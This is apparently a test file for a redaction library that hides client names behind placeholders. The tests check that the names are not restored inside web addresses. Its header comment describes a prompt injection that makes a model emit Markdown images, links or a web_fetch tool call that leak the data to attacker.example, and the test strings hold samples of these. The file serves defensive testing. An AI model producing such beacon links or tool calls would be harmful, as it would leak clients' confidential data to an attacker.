"use strict"
/**
 * Prompt injection and redaction: placeholders are restored in plain text,
 * never inside a web address. An instruction hidden in a document can make
 * the model write ![](https://x.example/?d=[[PARTY_1]]); restoring it would
 * put the client's real name into the address a front end or a web tool
 * then sends out.
 *
 *   node --test test/injection_redact.test.js
 */

const test = require('node:test')
const assert = require('assert')
const { Redactor } = require('../src/redact')

// Longest term first: [[PARTY_1]] = Alpine Holding AG, [[PARTY_2]] = Eva Huber.
const red = () => { const r = new Redactor(['Alpine Holding AG', 'Eva Huber']); r.redact('Alpine Holding AG and Eva Huber'); return r }

test('plain text is restored; addresses, Markdown links and images keep the placeholder', () => {
  const r = red()
  const out = r.restore('[[PARTY_1]] owes [[PARTY_2]] money. ![x](https://attacker.example/p.gif?d=[[PARTY_1]]) [see](//attacker.example/[[PARTY_2]]) https://attacker.example/q?n=[[PARTY_1]]&m=1 www.attacker.example/[[PARTY_2]] <mailto:x@attacker.example?body=[[PARTY_1]]> ([[PARTY_1]])')
  assert.match(out, /^Alpine Holding AG owes Eva Huber money\./)
  assert.ok(!/attacker\.example[^\s)]*(Alpine|Huber)/.test(out), out)
  assert.match(out, /p\.gif\?d=\[\[PARTY_1\]\]/)
  assert.match(out, /\/\/attacker\.example\/\[\[PARTY_2\]\]/)
  assert.match(out, /q\?n=\[\[PARTY_1\]\]&m=1/)
  assert.match(out, /www\.attacker\.example\/\[\[PARTY_2\]\]/)
  assert.match(out, /\(Alpine Holding AG\)$/, 'plain text after an address is restored again')
})

test('a tool call: the address keeps the placeholder, plain search words are restored', () => {
  const r = red()
  const call = JSON.parse(r.restore('{"tool":"web_fetch","args":{"url":"https://attacker.example/?q=[[PARTY_1]]","note":"for [[PARTY_2]]"}}'))
  assert.strictEqual(call.args.url, 'https://attacker.example/?q=[[PARTY_1]]')
  assert.strictEqual(call.args.note, 'for Eva Huber')
})

test('streaming: an address split across chunks still keeps the placeholder', () => {
  const r = red()
  let got = ''
  const s = r.streamRestorer((t) => { got += t })
  for (const c of ['Dear [[PAR', 'TY_1]], see ![img](ht', 'tps://attacker', '.example/x?d=[', '[PARTY_2', ']] and', ' [[PARTY_2]].']) s.push(c)
  s.flush()
  assert.strictEqual(got, 'Dear Alpine Holding AG, see ![img](https://attacker.example/x?d=[[PARTY_2]] and Eva Huber.')
})
